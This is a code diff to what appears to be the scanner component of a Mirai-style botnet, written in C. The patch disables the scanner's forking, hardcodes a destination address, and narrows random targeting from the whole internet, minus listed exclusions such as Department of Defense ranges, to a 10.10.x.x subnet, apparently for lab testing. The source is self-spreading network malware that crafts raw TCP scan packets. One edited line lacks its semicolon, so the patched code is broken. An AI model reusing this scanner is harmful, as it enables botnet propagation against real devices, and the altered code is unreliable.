@@ -64,9 +64,9 @@ void scanner_init(void)
     /*// Let parent continue on main thread
     scanner_pid = fork();
     if (scanner_pid > 0 || scanner_pid == -1)
-        return;
+        return;*/
 
-    LOCAL_ADDR = util_local_addr();*/
+    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     fake_time = time(NULL);
@@ -209,10 +209,10 @@ void scanner_init(void)
                 struct tcphdr *tcph = (struct tcphdr *)(iph + 1); //tcp header struct, tcp.h. iph+1 ?
                     //start generate packet
                 iph->id = rand_next(); //generate a random 32bit int
-                iph->saddr = LOCAL_ADDR; //local adress
+                iph->saddr = LOCAL_ADDR; //local address
                 //iph->daddr = get_random_ip(); //generate a random ip - avoid invalid / dept of def / local and other addresses
 
-                iph->daddr = 168430081;
+                iph->daddr = 16777343
 
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr)); //generate the checksum of the packet, check checksum.c
@@ -679,29 +679,13 @@ static ipv4_t get_random_ip(void)
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
 
-    do
-    {
-        tmp = rand_next();
+    tmp = rand_next();
 
-        o1 = tmp & 0xff;
-        o2 = (tmp >> 8) & 0xff;
-        o3 = (tmp >> 16) & 0xff;
-        o4 = (tmp >> 24) & 0xff;
-    }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
+    o1 = 10;
+    o2 = 10;
+    o3 = (tmp >> 16) & 0xff;
+    o4 = (tmp >> 24) & 0xff;
+
 
     return INET_ADDR(o1,o2,o3,o4);
 }
